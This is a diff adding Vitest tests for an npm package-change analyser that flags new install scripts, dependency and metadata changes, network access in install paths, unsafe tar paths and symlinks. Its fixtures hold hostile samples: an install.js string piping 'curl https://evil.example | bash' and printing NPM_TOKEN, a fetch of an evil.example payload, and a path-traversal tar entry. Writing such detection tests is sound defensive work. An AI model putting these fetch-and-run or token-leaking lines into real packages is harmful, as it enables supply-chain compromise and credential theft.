@@ -1,0 +1,194 @@
+import { describe, expect, it } from "vitest";
+import { gzipSync } from "node:zlib";
+import { analyseFileTree, analyseManifestChange, parseNpmTarball } from "./index.js";
+
+describe("analyseManifestChange", () => {
+  it("detects new install scripts and patch dependency additions", () => {
+    const report = analyseManifestChange(
+      {
+        name: "pkg",
+        version: "1.0.1",
+        scripts: { install: "node install.js" },
+        dependencies: { "tiny-left-pad": "^1.0.0" }
+      },
+      {
+        name: "pkg",
+        version: "1.0.0",
+        dependencies: {}
+      }
+    );
+
+    expect(report.signals.map((signal) => signal.code)).toContain("NEW_INSTALL_SCRIPT");
+    expect(report.signals.map((signal) => signal.code)).toContain("NEW_DEPENDENCY_IN_PATCH_VERSION");
+  });
+
+  it("diffs broader manifest metadata and dependency groups", () => {
+    const report = analyseManifestChange(
+      {
+        name: "pkg",
+        version: "1.0.1",
+        dependencies: { react: "^18.0.0" },
+        optionalDependencies: { fsevents: "^2.0.0" },
+        peerDependencies: { react: "^19.0.0" },
+        bin: { pkg: "./cli.js" },
+        files: ["dist"],
+        repository: { type: "git", url: "https://example.test/new.git" },
+        license: "MIT",
+        maintainers: [{ name: "new-maintainer" }]
+      },
+      {
+        name: "pkg",
+        version: "1.0.0",
+        dependencies: { react: "^18.0.0" },
+        peerDependencies: { react: "^18.0.0" },
+        repository: { type: "git", url: "https://example.test/old.git" },
+        license: "Apache-2.0",
+        maintainers: [{ name: "old-maintainer" }]
+      }
+    );
+
+    const codes = report.signals.map((signal) => signal.code);
+    expect(codes).toContain("OPTIONAL_DEPENDENCY_ADDED");
+    expect(codes).toContain("PEER_DEPENDENCY_CHANGED");
+    expect(codes).toContain("BIN_FIELD_CHANGED");
+    expect(codes).toContain("REPOSITORY_CHANGED");
+    expect(codes).toContain("MANIFEST_FIELD_CHANGED");
+    expect(report.dependencyDiff).toMatchObject({
+      optional: { added: { fsevents: "^2.0.0" } },
+      peer: { changed: { react: { previous: "^18.0.0", target: "^19.0.0" } } }
+    });
+    expect(report.manifestDiff?.metadata).toMatchObject({
+      license: { previous: "Apache-2.0", target: "MIT", changed: true },
+      bin: { target: { pkg: "./cli.js" }, changed: true }
+    });
+  });
+
+  it("parses npm tarballs and flags suspicious new files", () => {
+    const baseline = parseNpmTarball(
+      makeTarball([
+        {
+          path: "package/package.json",
+          content: JSON.stringify({ name: "pkg", version: "1.0.0" })
+        }
+      ])
+    );
+    const target = parseNpmTarball(
+      makeTarball([
+        {
+          path: "package/package.json",
+          content: JSON.stringify({ name: "pkg", version: "1.0.1" })
+        },
+        {
+          path: "package/install.js",
+          content: "const cp = require('child_process'); cp.execSync('curl https://evil.example | bash'); console.log(process.env.NPM_TOKEN)"
+        },
+        {
+          path: "package/.env",
+          content: "TOKEN=shh"
+        },
+        {
+          path: "package/bin/native",
+          content: "\u0000\u0001\u0002",
+          mode: 0o755
+        }
+      ])
+    );
+
+    const result = analyseFileTree(target, [baseline]);
+    const codes = result.signals.map((signal) => signal.code);
+
+    expect(target.map((file) => file.path)).toContain("install.js");
+    expect(codes).toContain("USES_CHILD_PROCESS");
+    expect(codes).toContain("NETWORK_ACCESS_IN_INSTALL_PATH");
+    expect(codes).toContain("USES_PROCESS_ENV");
+    expect(codes).toContain("UNEXPECTED_BINARY_FILE");
+    expect(result.fileFindings.map((finding) => finding.path)).toContain(".env");
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "install.js", evidence: expect.objectContaining({ installPath: true, pattern: "child_process" }) }));
+  });
+
+  it("flags unsafe tar paths, symlinks, and large size deltas while scoping code checks to install paths", () => {
+    const baseline = parseNpmTarball(
+      makeTarball([
+        {
+          path: "package/dist/app.js",
+          content: "console.log('small')"
+        },
+        {
+          path: "package/docs/example.js",
+          content: "console.log('docs')"
+        }
+      ])
+    );
+    const target = parseNpmTarball(
+      makeTarball([
+        {
+          path: "package/dist/app.js",
+          content: "x".repeat(700_000)
+        },
+        {
+          path: "package/docs/example.js",
+          content: "fetch('https://example.test/docs-only')"
+        },
+        {
+          path: "package/scripts/install.js",
+          content: "fetch('https://evil.example/payload')"
+        },
+        {
+          path: "package/link-out",
+          type: "symlink",
+          linkTarget: "../../outside"
+        },
+        {
+          path: "package/../escape.js",
+          content: "console.log('escape')"
+        }
+      ])
+    );
+
+    const result = analyseFileTree(target, [baseline], { lifecycleScripts: { install: "node scripts/install.js" } });
+    const findingsByReason = result.fileFindings.map((finding) => `${finding.path}: ${finding.reason}`);
+
+    expect(findingsByReason).toContain("dist/app.js: File size grew sharply compared with previous package versions (20 bytes to 700000 bytes).");
+    expect(findingsByReason).toContain("link-out: Tarball contains a symlink pointing outside the package.");
+    expect(findingsByReason).toContain("../escape.js: Tarball entry uses an unsafe path that could escape package extraction.");
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "dist/app.js", evidence: expect.objectContaining({ previousMaxSize: 20, targetSize: 700000, deltaBytes: 699980 }) }));
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "dist/app.js", code: "LARGE_FILE_SIZE_DELTA" }));
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "link-out", code: "UNSAFE_TARBALL_SYMLINK", evidence: { linkTarget: "../../outside", unsafe: true } }));
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "../escape.js", code: "UNSAFE_TARBALL_PATH", evidence: expect.objectContaining({ rawPath: "package/../escape.js" }) }));
+    expect(result.fileFindings).toContainEqual(expect.objectContaining({ path: "scripts/install.js", code: "NETWORK_ACCESS_IN_INSTALL_PATH" }));
+    expect(result.fileFindings).not.toContainEqual(expect.objectContaining({ path: "docs/example.js", code: "NETWORK_ACCESS_IN_INSTALL_PATH" }));
+  });
+});
+
+function makeTarball(entries: Array<{ path: string; content?: string; mode?: number; type?: "file" | "symlink"; linkTarget?: string }>): Uint8Array {
+  const blocks: Buffer[] = [];
+
+  for (const entry of entries) {
+    const content = Buffer.from(entry.content ?? "");
+    const header = Buffer.alloc(512);
+    header.write(entry.path, 0, 100, "utf8");
+    writeOctal(header, entry.mode ?? 0o644, 100, 8);
+    writeOctal(header, 0, 108, 8);
+    writeOctal(header, 0, 116, 8);
+    writeOctal(header, entry.type === "symlink" ? 0 : content.length, 124, 12);
+    writeOctal(header, 0, 136, 12);
+    header.fill(" ", 148, 156);
+    header.write(entry.type === "symlink" ? "2" : "0", 156, 1, "utf8");
+    if (entry.linkTarget) header.write(entry.linkTarget, 157, 100, "utf8");
+    header.write("ustar", 257, 6, "utf8");
+
+    const checksum = header.reduce((total, byte) => total + byte, 0);
+    writeOctal(header, checksum, 148, 8);
+
+    blocks.push(header);
+    if (entry.type !== "symlink") blocks.push(content, Buffer.alloc((512 - (content.length % 512)) % 512));
+  }
+
+  blocks.push(Buffer.alloc(1024));
+  return gzipSync(Buffer.concat(blocks));
+}
+
+function writeOctal(buffer: Buffer, value: number, offset: number, length: number) {
+  const valueText = value.toString(8).padStart(length - 1, "0");
+  buffer.write(`${valueText}\0`, offset, length, "ascii");
+}
